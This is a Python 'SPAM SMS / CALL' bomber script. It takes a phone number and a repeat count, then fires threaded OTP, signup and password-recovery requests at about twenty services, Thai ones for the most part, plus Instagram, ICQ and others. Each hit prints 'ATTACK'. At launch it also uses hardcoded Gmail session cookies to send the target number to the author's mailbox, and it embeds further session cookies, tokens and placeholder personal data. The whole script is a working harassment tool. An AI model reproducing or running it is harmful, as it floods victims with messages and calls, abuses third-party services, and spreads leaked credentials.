import os, sys, time, requests, threading, random, json
from threading import Thread
from requests import Session, post
from re import search

#color
r = "\033[31m"
w = "\033[1;0m"
Y = "\033[33m"
gg = "\033[32m"
wow = "\033[36m"

rand = (wow,gg,Y)
t = random.choice(rand)

def banner():
	print()
	print(f"                         {w}SPAM {t}SMS {w}/ {t}CALL")
	print(f'{w}       ----------------------------------------------------')
	print(f'{t}      .dP"Y8 88""Yb   db    8b    d8 8b    d8 888888 88""Yb ')
	print(f'      `Ybo." 88__dP  dPYb   88b  d88 88b  d88 88__   88__dP ')
	print(f'        `Y8b 88"""  dP__Yb  88YbdP88 88YbdP88 88""   88"Yb  ')
	print(f'       8bodP 88    dP""""Yb 88 YY 88 88 YY 88 888888 88  Yb ')
	print(f'{w}       ----------------------------------------------------')

#https://youtu.be/eZYtnzODpW4
banner()
print()
print(f"{t}╭──[{w}CUSTOMIZE{t}]")
phone = input(f"{t}[{w}={t}]{w}PHONE {t}+> {w}")
num = int(input(f"{t}[{w}={t}]{w}AMOUNT {t}+> {w}"))
print()
user = "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
def gmail():
	head = {
	   "Host": "mail.google.com",
	   "content-length": "434",
	   "sec-ch-ua-mobile": "?1",
	   "user-agent": user,
	   "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
	   "accept": "*/*",
	   "origin": "https://mail.google.com",
	   "sec-fetch-site": "same-origin",
	   "sec-fetch-mode": "cors",
	   "sec-fetch-dest": "empty",
	   "referer": "https://mail.google.com/mail/mu/mp/136/",
	   "cookie": "GM_IMP=sp-su-hs-1%2Fmc-ht-1%2Fspn-tl-r-l-nbgs-886%2Fspn-tl-r-l-886%2Fsp-upload-apm-0;COMPASS=gmail=CogBAAlriVdLDCQRCrX0jl5z6lc44TDw_-DJ8XsJ1FWJXY2tBoWZTGtgwwve_Y-aK7FufoSZlCMxXh0_jhIU7MTnE2Lesaq0Ev83R4Y_wRRxUZhpsKqN5IybTKGAmt4y7k3Uz1M8fHkB_bKHruaIGw276yVfEsFJAWB5CKbTLyfRz1o4C4cE5nP_FBDh8dCQBhqaAQAJa4lXxafb4FWlwcjtbTO-IYSjkiWfkCHUtmqUxpr0mjmk9816-w_RR8Aj4bjlHhrC82vszrit4lbdMXuL8XLhlK-8ZchAmaSLxJs1O-xnQBfFxCSxI7QN2l5g5fSNigNFo45r0fzHHnXbMDuVI2Aml3aAmh93z4WQVGN1gxO8P7ejfz3vLvF_u5gVC7fq3KlwahR7UUs-8ho;GX=DUMMY;WML=1645488878963#sbox8390@gmail.com:981:0#ronhotaz@gmail.com:547:1#potterter555@gmail.com:117:2#pottersleep@gmail.com:136:3;OGPC=19024263-2:;OSID=GwgSDlHlbS3BCxlevE4U-vw6FCmONYz8vNQo8KT1kwA4YFBRFgb_SEPZ15zimlZKeao_RA.;__Secure-OSID=GwgSDlHlbS3BCxlevE4U-vw6FCmONYz8vNQo8KT1kwA4YFBRXJ5OTAd7WZZUkTsKvo7EFQ.;SID=HAgSDqDVdZLdB9HAmvVDnFGTY6oWcpLQMpVhYabBjl23Id2ypLfAZt_m9FwTXLk78fLM-Q.;__Secure-1PSID=HAgSDqDVdZLdB9HAmvVDnFGTY6oWcpLQMpVhYabBjl23Id2yxHzkSg-T0Iqz0jKB2baGJQ.;__Secure-3PSID=HAgSDqDVdZLdB9HAmvVDnFGTY6oWcpLQMpVhYabBjl23Id2yGzRZDZPzXFqu-KXhYPDzoA.;HSID=A9ImniZrAv79eqARI;SSID=AB7WVYYuV3-YNbCBX;APISID=SuGvuJvP8DXy37S-/AfV9dvtrsrb3bX9Th;SAPISID=W0NYjbZZDOTe3GQH/AZqfjyD98gLGl-DJQ;__Secure-1PAPISID=W0NYjbZZDOTe3GQH/AZqfjyD98gLGl-DJQ;__Secure-3PAPISID=W0NYjbZZDOTe3GQH/AZqfjyD98gLGl-DJQ;SEARCH_SAMESITE=CgQI4JQB;1P_JAR=2022-02-22-00;NID=511=Q5bOjNTzAXvcWsvr2e6fAI6l4lS4YLoThMkPs4LNPGJW1f_zM0pBD3eKPziuh5dInobCdAuFR-0PGICUrMjfC7M3DYuqOnjplqnDzooftPVZoFqOxpxVj1Vvm0tmebtkLFzMKIFD-G-tpGQ7bkk0qV9zKC26_ziw3BV0pWEfq8MHVajE56lyGVDZgJ-tDX_d5ugpzoW0DZg2h8ipDGBKQpljGztD0Ke53rtcbSDHH70aWHO_aS-uYNceBe7D9x8lOKMcCKB-sHc9SITm0Ocevq0ih7G69FVyrJK6WlYWYVYGgcleZXVV2I745xaxwmzXiz-wwhTtWnBul2NNbrvCy-0iBbgXOdmHI20tBbs2mN1Z2N0qqGkxKalOzWPDWxcueiFMiZkREQZgGESLZHm4R_WnuMZT0koCXXGZ8a4TMArR;SIDCC=AJi4QfH6LFik397ukU1KR3Hvyzf9h1wwwMXngDOd65qWfFf6xqtHgxpfIyyj0H0EfxziN4pIbw;__Secure-3PSIDCC=AJi4QfGRkrfAAmgu7KXEENPyTWjy-dJtiSkiQPS8C86wAnfYP6gUWX8SOlBms9_B4OgLSPCVbg"
	}
	requests.post("https://mail.google.com/mail/u/3/s/?v=or&ik=621e2393cf&at=AF6bupNdFMdOJ6U84TXVTnovSk2gaMGHXg&subui=android&wjt=p&orwas=1&cfact=7694&suim=true&wasmp=136&ui=savannah&hl=th&ts=1645488998136",headers=head,data=f"s_jr=%5Bnull%2C%5B%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2C%5Bnull%2C%5B%5Bnull%2C%22potterter555%40gmail.com%22%2C%22%22%2Cnull%5D%5D%2C%5B%5D%2C%5B%5D%2C%5Bnull%2C%22pottersleep%40gmail.com%22%2Cnull%2Cnull%5D%2C%5B%5D%2C%22PHONE-TRAP%22%2C%22{phone} | {num}%22%2C1%2Cnull%2C%2217f1ec97572f2ff2%22%2Cnull%2Ctrue%2Cnull%2C%224vtry2yvgv3c%22%2Cfalse%2C%5B%5D%5D%2Cnull%5D%5D%5D%2C2%2Cnull%2Cnull%2Cnull%2C%22621e2393cf%22%5D")
	pass
			
for x in range(1):
	threading.Thread(target=gmail).start()
	
def api1(): #the1
    try:
        jun = ('phone')
        req = requests.post(
            "https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
            json={
                "on": {
                    "value": phone,
                    "country": "66"
                },
                "type": "mobile"
            })
        if str(jun) in str(req.text):
            print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
        else:
        	pass
    except:
        pass
        
def api2():  # PT-MAXCARD
    try:
        jun = ('phone')
        req = requests.get(
            f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
        )
        if str(jun) in str(req.text):
            print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
        else:
            pass
    except:
        pass
        
useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
def api3(): #shopat24
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})
    print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    
def api4():  # True-Shopp
    try:
        jun = ('phone')
        req = requests.post(
            "https://api.true-shopping.com/customer/api/request-activate/mobile_no",
            data={"username": phone})
        if str(jun) in str(req.text):
            print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
        else:
            pass
    except:
        pass
        
def api5():  # SSO
    try:
        jun = ('Mobile')
        req = requests.post(
            'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',
            headers={
                "User-Agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With":
                "XMLHttpRequest",
                "Cookie":
                "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"
            },
            data=
            f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER"
        )
        if str(jun) in str(req.text):
            print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    except:
        pass
        
#true cvc       
        
def api6(): #INSTAGRAM
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
	
def api7(): #QUICKCSH8
	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
	print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
	
def api8(): #QQMONEY
	requests.post("https://www.qqmoney.ltd/jackey/sms/login",json = {"appId":"5fc9ff297eb51f1196350635","companyId":"5fc9ff12197278da22aff029","mobile": phone},headers={"Content-Type": "application/json;charset=UTF-8"})
	print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")

def api9(): #BUGABOO.TV
    try:
        jun = ('phone')
        req = requests.post(
            "https://cognito-idp.ap-southeast-1.amazonaws.com/",
            headers={
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "content-type": "application/x-amz-json-1.1",
                "x-amz-target": "AWSCognitoIdentityProviderService.SignUp",
                "x-amz-user-agent": "aws-amplify/0.1.x js",
                "referer": "https://www.bugaboo.tv/members/signup/phone"
            },
            json={
                "ClientId":
                "6g47av6ddfcvi06v4l186c16d6",
                "Username":
                f"+66{phone[1:]}",
                "Password":
                "098098Az",
                "UserAttributes": [{
                    "Name": "name",
                    "Value": "Dbdh"
                }, {
                    "Name": "birthdate",
                    "Value": "2005-01-01"
                }, {
                    "Name": "gender",
                    "Value": "Male"
                }, {
                    "Name": "phone_number",
                    "Value": f"+66{phone[1:]}"
                }, {
                    "Name": "custom:phone_country_code",
                    "Value": "+66"
                }, {
                    "Name": "custom:is_agreement",
                    "Value": "true"
                }, {
                    "Name": "custom:allow_consent",
                    "Value": "true"
                }, {
                    "Name": "custom:allow_person_info",
                    "Value": "true"
                }],
                "ValidationData": []
            })
        req1 = requests.post(
            "https://cognito-idp.ap-southeast-1.amazonaws.com/",
            headers={
                "cache-control": "max-age=0",
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "content-type": "application/x-amz-json-1.1",
                "x-amz-target":
                "AWSCognitoIdentityProviderService.ResendConfirmationCode",
                "x-amz-user-agent": "aws-amplify/0.1.x js",
                "referer": "https://www.bugaboo.tv/members/resetpass/phone"
            },
            json={
                "ClientId": "6g47av6ddfcvi06v4l186c16d6",
                "Username": f"+66{phone[1:]}"
            })
        if str(jun) in str(req.text):
            print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    except:
        pass
        
def api10(): #NOCNOC
    requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
    print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    
def api11(): #KERRYEXPRESS
	requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
	print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")

def api12(): #CARSOME
    requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
    print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    
def api13(): #icq
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
	print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
	
def api14(): #makroclick
    json = {"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json=json)
    print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    
def api15():  # CMSMS
    try:
        jun = ('phone')
        req = requests.post("https://unacademy.com/api/v3/user/user_check/",
                            json={
                                "phone": phone,
                                "country_code": "TH"
                            },
                            headers={}).json()
        if str(jun) in str(req.text):
            print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    except:
        pass
        
def api16(): #call #MyFave
    try:
        jun = ('phone')
        req = requests.post(
            "https://api.myfave.com/api/fave/v3/auth",
            headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},
            json={"phone": "66" + phone})
        if str(jun) in str(req.text):
            print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    except:
        pass
      
def api17(): #msport1688
	post("https://www.msport1688.com/auth/otp_sender", data={"phone=": phone,"otp=":"","password=":"","bank=":"","bank_number=":"","full_name=":"","ref=":""})
	print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    
def api18():
	post("http://b226.com/x/code",data={"phone": phone})
	print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
	
def api19():
	head = {
	   "Host": "www.berlnw.com",
	   "sec-ch-ua-mobile": "?1",
	   "content-length": "54",
	   "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	   "x-requested-with": "XMLHttpRequest",
	   "user-agent": "Mozilla/5.0 (Linux; Android 5.1; OPPO F1s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	   "origin": "https://www.berlnw.com",
	   "sec-fetch-site": "same-origin",
	   "sec-fetch-mode": "cors",
	   "sec-fetch-dest": "empty",
	   "referer": "https://www.berlnw.com/reservelogin",
	   "cookie": "_referrer_og=https%3A%2F%2Fwww.google.com%2F;_jsuid=2829969038;_fbp=fb.1.1639386288551.1113129095;berlnw=s%3AJFv0qfoIAzgQ9l67-Ewf-8RTZLHK8SUM.t87pPuDWirleogt5q6gdVTdxAPGs2DOkTOxfoxPtXz8;_first_pageview=1;_gid=GA1.2.1078676213.1645490419;_gac_UA-90695720-1=1.1645490419.Cj0KCQiAjc2QBhDgARIsAMc3SqS7nGfnjCreg4JHOhOgszyFqFcU5H7Vdpl08Py7xIV8KF-i0ZITpogaAnFHEALw_wcB;cf_clearance=IwTo9orOELhNHxaAcjspaXmTeUbszjqtucm9ACxLggE-1645490571-0-150;_ga_5VX77S4XCC=GS1.1.1645490418.1.1.1645490571.0;_ga=GA1.2.1187488494.1639386288;_gat_gtag_UA_90695720_1=1"
	}
	post("https://www.berlnw.com/myreserve/resendotp", headers=head, data={"id=": phone,"&number=":"undefined","&client_number=":"undefined"})
	print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
	
def api20(): #truemoveh
	requests.post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phone})
	print(f"{t}[{w}#{t}] {w}ATTACK {t}+> {phone} {t}<+")
    
for i in range(num):
	time.sleep(0.5)
	threading.Thread(target=api1).start()
	threading.Thread(target=api2).start()
	threading.Thread(target=api3).start()
	threading.Thread(target=api4).start()
	threading.Thread(target=api5).start()
	threading.Thread(target=api6).start()
	threading.Thread(target=api7).start()
	threading.Thread(target=api8).start()
	threading.Thread(target=api9).start()
	threading.Thread(target=api10).start()
	threading.Thread(target=api11).start()
	threading.Thread(target=api12).start()
	threading.Thread(target=api13).start()
	threading.Thread(target=api14).start()
	threading.Thread(target=api15).start()
	threading.Thread(target=api16).start()
	threading.Thread(target=api18).start()
	threading.Thread(target=api19).start()
	threading.Thread(target=api20).start()
	
"""

NO COPY PLZZZZZ

"""